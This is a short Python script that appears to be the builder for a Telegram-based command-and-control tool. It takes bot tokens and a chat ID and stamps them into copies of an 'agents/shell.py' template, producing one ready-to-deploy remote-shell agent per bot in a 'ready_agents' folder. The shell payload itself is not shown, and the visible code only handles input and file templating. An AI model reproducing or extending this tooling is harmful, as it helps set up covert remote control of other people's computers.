import os
import re
import shutil


def main():
    """
    The main start and variables that will use later in the script
    """
    end = True
    while end:
        try:
            bot_amount = int(input("How much telegram bot agents do you use: "))
        except ValueError as e:
            print(f"Error: {e}")
            continue
        try:
            chat_id = input("Enter the chat ID of the telegram bot agents do you use as interface: ")
        except Exception as e:
            print(f"Error: {e}")
            continue
        end = False
    creation(bot_amount, chat_id)


def creation(bot_amount: int, chat_id: str):
    """
    Create the script using the agents/shell.py file, the chat id of the chat, and the bot token.
    :param bot_amount: The bot amount
    :param chat_id: The telegram chat id
    """
    if os.path.isdir("./ready_agents"):
        if len(os.listdir("./ready_agents")) > 0:
            shutil.rmtree("./ready_agents")
    if not os.path.isdir("./ready_agents"):
        os.makedirs("./ready_agents")
    for num in range(1, bot_amount + 1):
        with open("agents/shell.py", "r") as file:
            text = file.readlines()
        final_text = ""
        while True:
            TOKEN = input("Enter the telegram bot API Token of the telegram bot agents do you: ")
            if not is_valid_token(TOKEN):
                print("This is not a valid token.\nPlease enter the right telegram bot API.")
                continue
            break
        for line in text:
            if "CHAT_ID = " in line:
                line = f'CHAT_ID = "{chat_id}"\n'
            if "TOKEN = " in line:
                line = f'TOKEN = "{TOKEN}"\n'
            final_text += line
        with open(f"ready_agents/shell_id_{TOKEN.split(':')[0]}.py", "w") as file:
            file.write(final_text)
    print("The bot agent scripts are ready and exiting in ./ready_agents directory!.")
    print("Install telegram for the C2C interface.")


def is_valid_token(token: str):
    """
    Check the telegram bot API tokens are in the right format: <bot_id>:<bot_token>
    :param token: The api token to check
    """
    pattern = r'^\d+:[\w-]+$'
    return re.match(pattern, token) is not None


if __name__ == "__main__":
    main()